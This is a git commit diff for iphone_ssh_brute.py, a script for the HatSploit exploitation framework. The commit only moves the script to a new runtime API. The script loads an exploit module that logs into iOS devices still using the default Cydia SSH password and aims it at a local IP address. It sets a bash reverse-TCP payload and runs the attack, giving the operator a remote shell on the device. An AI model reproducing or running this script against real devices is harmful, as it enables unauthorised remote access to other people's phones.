a0cb92321c8a87f8c89112bfaa35a2f0fea8d29e
Ivan Nikolsky <enty8080@gmail.com>
2022-05-09 09:41:31 +0300

    Update iphone_ssh_brute.py

--- iphone_ssh_brute.py
+++ iphone_ssh_brute.py
@@ -1,21 +1,14 @@
-from hatsploit.lib.config import Config
-
-config = Config()
-config.configure() # Read HatSploit configs and paths
-
-from hatsploit.core.console import Console
-
-console = Console()
-console.start_hsf() # Load databases and core modules
-
+from hatsploit.lib.runtime import Runtime
 from hatsploit.lib.modules import Modules
 
+runtime = Runtime()
 modules = Modules()
+
+runtime.start()
 modules.use_module("exploit/apple_ios/ssh/cydia_default_password")
 
-console.update_events() # Update HatSploit states and options
+runtime.update()
 
 modules.set_current_module_option('HOST', '192.168.1.68')
 modules.set_current_module_option('PAYLOAD', 'unix/generic/bash_reverse_tcp')
-
 modules.run_current_module()
